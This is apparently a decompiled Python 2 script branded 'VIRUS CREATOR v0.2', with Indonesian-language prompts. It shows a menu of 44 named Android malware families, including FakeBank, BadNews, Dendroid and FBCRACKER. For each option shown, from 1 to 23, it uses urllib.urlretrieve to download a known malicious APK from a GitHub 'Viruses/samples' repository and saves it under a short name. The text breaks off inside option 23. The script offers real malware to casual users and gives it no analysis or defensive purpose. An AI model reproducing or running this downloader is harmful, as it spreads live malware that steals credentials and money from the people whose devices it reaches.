# Source Generated With Decompyle++
# File : ok.pyc (Python 2.7)
# Decompiled At : Fri Apr 10 19:59:52 WIB 2020

import os
import sys
import time
import urllib
from sys import stdout
hijau = '\x1b[32m'
cyan = '\x1b[36m'
kuning = '\x1b[33;1m'
ungu = '\x1b[35m'
putih = '\x1b[37m'
merah = '\x1b[31m'
biru = '\x1b[34m'
batas = '%s-=====================================-' % merah
logo = '\n%s    #  #  ###   ###   #  #   ##\n%s    #  #   #    #  #  #  #  #  #\n%s    #  #   #    #  #  #  #   #\n%s    #  #   #    ###   #  #    #\n%s     ##    #    # #   #  #  #  #\n%s     ##   ###   #  #   ##    ## %s[%sv0.2%s]\n%s-==========| %sVIRUS CREATOR %s|==========-' % (cyan, cyan, cyan, cyan, cyan, cyan, putih, kuning, putih, merah, hijau, merah)

def keluar():
    print '%s(%s!%s) %sExit Program' % (putih, merah, putih, merah)
    sys.exit()

men = '   %s[%sB%s]%s BACK MENU\n   %s[%sE%s]%s EXIT' % (putih, cyan, putih, hijau, putih, merah, putih, merah)

def load(word):
    lix = [
        '/',
        '-',
        '\xe2\x95\xb2',
        '|']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write('\r{}{}'.format(str(word), lix[x]))
            time.sleep(0.3)
            sys.stdout.flush()
        
    


def android():
    os.system('clear')
    print logo
    print '  %s(%s01%s)%s AGENTS        %s(%s23%s) %sCHISPICAN' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s02%s)%s BADNEWS       %s(%s24%s) %sCOMFUNNY' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s03%s)%s BIOS          %s(%s25%s) %sCOMIMAGE' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s04%s)%s BLASMS        %s(%s26%s)%s COMKICHEN' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s05%s)%s BRATEST       %s(%s27%s)%s COMLAUGHTR' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s06%s)%s CLACO         %s(%s28%s)%s PRASESAMOR' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s07%s)%s DRPDIAL       %s(%s29%s)%s PRASESFEE' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s08%s)%s FAKEBNK       %s(%s30%s)%s RECIPSMART' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s09%s)%s FAKECMC       %s(%s31%s)%s ROMATICPOS' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s10%s)%s FAKEDOC       %s(%s32%s)%s STATETS' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s11%s)%s FAKEVLD       %s(%s33%s)%s THINKING' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s12%s)%s FOBUS         %s(%s34%s)%s CRD' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s13%s)%s GINMAST       %s(%s35%s)%s DENDROID' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s14%s)%s MASNU         %s(%s36%s)%s DS' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s15%s)%s ELITE         %s(%s37%s)%s FACEBOOK' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s16%s)%s OMIGO         %s(%s38%s)%s FAKEAV' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s17%s)%s OPFAKE        %s(%s39%s)%s ARTSTATION' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s18%s)%s SMSWORK       %s(%s40%s)%s MUSICPLAYER' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s19%s)%s VIETCON       %s(%s41%s)%s SETTING' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s20%s)%s CANDYCRN      %s(%s42%s)%s FBCRACKER' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s21%s)%s CAT           %s(%s43%s)%s GAMEML' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s22%s)%s CHISCOR       %s(%s44%s)%s TAKEBEAR' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print batas
    print men
    print batas
    pilih_android()


def pilih_android():
    mana = raw_input('\x1b[37m(\x1b[36m!\x1b[37m)\x1b[32m input@rzky\x1b[31m =>\x1b[33;1m ')
    if mana == '':
        print '%s(%s!%s)%s Invalid Menu' % (putih, merah, putih, merah)
        pilih_android()
    elif mana in ('1', '01'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Agent.apk', 'agents.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('2', '02'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/BadNews.A.apk', 'badnews.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('3', '03'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Bios.NativeMaliciousCode.apk', 'bios.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('4', '04'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Blatantsms.apk', 'blasms.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('5', '05'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/BrainTest.apk', 'bratest.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('6', '06'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Claco.A.apk', 'claco.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('7', '07'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Dropdialer.apk', 'drpdial.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('8', '08'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/FakeBank.B.apk', 'fakebnk.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('9', '09'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/FakeCMCC.A.apk', 'fakecmc.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('10',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/FakeDoc.apk', 'fakedoc.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('11',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/FakeValidation.apk', 'fakevld.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('12',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Fobus.apk', 'fobus.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('13',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/GinMaster.Z.AdvancedObfuscation.apk', 'ginmast.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('14',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Masnu.apk', 'masnu.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('15',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Minecraft2.apk', 'elite.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('16',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Omigo.apk', 'omigo.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('17',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Opfake.apk', 'opfake.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('18',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/SmsWorker.apk', 'smswork.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('19',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Vietcon.apk', 'vietcon.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('20',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/candy_corn.apk', 'candycrn.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('21',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/cat.apk', 'cat.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('22',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/chistescortos.apk', 'ciscor.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('23',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/chistespicanticos.apk', 'cispican.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
